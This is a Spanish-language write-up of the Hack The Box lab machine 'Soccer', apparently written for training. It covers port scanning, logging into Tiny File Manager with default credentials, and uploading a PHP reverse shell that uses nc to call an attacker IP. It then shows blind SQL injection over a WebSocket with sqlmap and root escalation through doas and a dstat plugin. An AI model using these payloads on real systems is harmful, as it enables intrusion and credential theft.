# Soccer #

- **Tipo:** Boot2Root
- **Dificultad:** Easy
- **IP:** 10.10.11.194
- **Autor:** sau123
- **Autor del Writeup:** [focab0r](https://github.com/focab0r)

## WriteUp ##

### Foothold ###

Como de costumbre, empezamos con el escaneo **nmap**, el cual devuelve 3 puertos abiertos:
```
focab0r@arsenium:~$ sudo nmap -p- 10.10.11.194 -sS --min-rate 5000

Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-27 17:47 CEST
Nmap scan report for soccer.htb (10.10.11.194)
Host is up (0.068s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9091/tcp open  xmltec-xmlmail

Nmap done: 1 IP address (1 host up) scanned in 12.25 seconds
```
Proseguimos con un escaneo mas profundo, en el cual, tras especificar los puertos abiertos, se agrega la opcion `-sCV`, la cual permite, entre otras cosas, obtener la version de la aplicacion que se encuentra detras de cada puerto. 
```
focab0r@arsenium:~$ sudo nmap -p 22,80,9091 -sCV 10.10.11.194 -sS --min-rate 5000

Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-27 17:52 CEST
Nmap scan report for soccer.htb (10.10.11.194)
Host is up (0.042s latency).

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Soccer - Index 
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close

<...SNIP...>
```
Mientras que en el puerto 22 (ssh), y en el 80 (servidor web), nmap ha obtenido resultados, para el 9091 no ha logrado sacar la version.

#### Puerto 80 ####

Accediendo al puerto 80, el navegador redirige al dominio **soccer.htb**, el cual hay que añadir en el archivo `/etc/hosts`. La pagina contiene informacion sobre un equipo de futbol llamado "HTB". Como no hay mas informacion en la web, pasamos a enumerar archivos y directorios con **ffuf**:
```
focab0r@arsenium:~$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://soccer.htb/FUZZ


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://soccer.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 89ms]
    * FUZZ: tiny
```
El directorio `tiny` redirige a un login, tras el cual se encuentra una aplicacion llamada **Tiny File Manager**. Como las credenciales comunes no funcionan, buscamos las credenciales por defecto de la aplicacion, las cuales se pueden encontrar en el repositorio de [GitHub oficial](https://github.com/prasathmani/tinyfilemanager), visitando el archivo `tinyfilemanager.php`:
```
<...SNIP...>

// Login user name and password
// Users: array('Username' => 'Password', 'Username2' => 'Password2', ...)
// Generate secure password hash - https://tinyfilemanager.github.io/docs/pwd.html
$auth_users = array(
    'admin' => '$2y$10$/K.hjNr84lLNDt8fTXjoI.DBp6PpeyoJ.mGwrrLuCZfAwfSAGqhOW', //admin@123
    'user' => '$2y$10$Fg6Dz8oH9fPoZ2jJan5tZuv6Z4Kp7avtQ9bDfrdRntXtPeiMAZyGO' //12345
);

<...SNIP...>
``` 
El par `admin:admin@123` es valido, y permite loguearnos en el gestor de archivos de la pagina web, donde podemos subir nuestros propios archivos. Subiendo un php que contenga una reverse shell como el siguiente, y accediendo desde el navegador, se obtiene el foothold.

Reverse shell:
```
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 9443 >/tmp/f"); ?>
```   
Maquina atacante:
```
focab0r@arsenium:~$ nc -lvnp 9443

listening on [any] 9443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.194] 52628
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ hostname
soccer
$  
```

### Lateral Movement ###

Hemos entrado a la maquina como el usuario **www-data**, que es un usuario de servicio. Por lo tanto, hay que realizar un movimiento lateral a un usuario de sistema. Mirando en el archivo `/etc/passwd` los usuarios con `/bin/bash`, los posibles objetivos son:
```
www-data@soccer:~$ cat /etc/passwd | grep bash

root:x:0:0:root:/root:/bin/bash
player:x:1001:1001::/home/player:/bin/bash
```
Como las principales tecnicas de escalado de privilegios no funcionan, pasamos a enumerar archivos. En el `/etc/hosts` encontramos un nuevo subdominio, el cual, tras añadirlo en el `/etc/hosts` de nuestro sistema, podemos acceder desde el navegador.
```
www-data@soccer:~$ cat /etc/hosts

127.0.0.1	localhost	soccer	soccer.htb	soc-player.soccer.htb
127.0.1.1	ubuntu-focal	ubuntu-focal
```
El nuevo subdominio es similar a la pagina principal, pero tiene tambien las funciones de registrarse, loguearse y ver los partidos. Tras registrase y acceder al nuevo usuario, aparece un apartado donde podemos insertar un numero de ticket, y la aplicacion devuelve si existe o no. Como no parece vulnerable a inyecciones, observamos el codigo fuente, donde vemos que se hace una peticion a un **WebSocket** en el puerto 9091, pasandole el parametro "id":
```
<...SNIP...>

var ws = new WebSocket("ws://soc-player.soccer.htb:9091");

<...SNIP...>

function sendText() {
    var msg = input.value;
    if (msg.length > 0) {
        ws.send(JSON.stringify({
            "id": msg
        }))
    }
    else append("????????")
}

<...SNIP...>
```

#### Puerto 9091 ####

Uno de los protocolos mas utilizados son los **WebSockets** (ws://), que funciona como APIs. Para interactuar con ellos, es posible utilizar aplicaciones como **websocat**, aunque tambien se pueden usar scripts en python, como el siguiente:
```
from websocket import create_connection
import json

ws_host = 'ws://soc-player.soccer.htb:9091' #Host

ws = create_connection(ws_host) #Raiz a la que acceder, por defecto el host
ws.send(json.dumps({"id":"1"})); #Parametros a enviar

result = ws.recv()
print(result)
``` 
Ejecutandolo, devuelve el mismo error que la pagina web:
```
Ticket Doesn't Exist
```
Para automatizar el proceso de busqueda de vulnerabilidades en el WebSocket, se pueden utilizar distintas herramientas, como **Sqlmap**. Sin embargo, al no tratarse del protocolo http, hay que adaptar el escaneo, tal como se explica en la siguiente [pagina](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html). En pocas palabras, lo que se hace en el post es establecer un servidor intermediario, que intercepta las peticiones realizadas por **Sqlmap**, y las transforma a lenguaje de WebSocket. Simplemente modificando el Host y el parametro "employeeID" por "id", se puede levantar el servidor, el cual devuelve una URL a la que atacar. Finalmente, se puede lanzar **Sqlmap**:
```
focab0r@arsenium:~$ sqlmap -u "http://localhost:8081/?id=*" --level 2 --risk 2 --dump
```
Tras encontrar que es vulnerable a "MySQL >= 5.0.12 time-based blind - Parameter replace", dumpea la base de datos, en la que se encuentra un par usuario-contraseña, validas para ssh.
```
Database: soccer_db
Table: accounts
[1 entry]
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+
```
La flag se encuentra en `/home/player/user.txt`

### PrivEsc ###
A la hora de mirar que binarios contienen el SUID, aparece, entre otros, **doas**:
```
player@soccer:~$ find / -perm -4000 2> /dev/null

/usr/local/bin/doas

<...SNIP...>
```
**Doas** es una aplcacion muy similar a **sudo**. Permite a un usuario ejecutar comandos como otro usuario diferente, siempre y cuando este habilitado para ello. Como su intalacion no viene por defecto en Linux, esto significa que ha sido instalado a proposito por el administrador.

Los permisos de **doas** son asignados en el archivo `doas.conf`, el cual se puede buscar mediante el uso de **find**:
```
player@soccer:~$ find / -iname doas.conf 2> /dev/null

/usr/local/etc/doas.conf

player@soccer:~$ cat /usr/local/etc/doas.conf

permit nopass player as root cmd /usr/bin/dstat
```
El binario permite a player ejecutar el comando **dstat** con privilegios de root. Segun [GTFOBins](https://gtfobins.github.io/gtfobins/dstat/#sudo), guardando la invocacion a una shell en un archivo de python, y llamandolo como un plugin de **dstat**, es posible escalar privilegios. Por lo tanto, simplemente es necesario seguir los pasos y modificarlos ligeramente teniendo en cuenta que en vez de **sudo**, hay que utilizar **doas**:
```
player@soccer:~$ echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_xxx.py

player@soccer:~$ doas -u root /usr/bin/dstat --xxx

/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```
La flag se encuentra en `/root/root.txt`
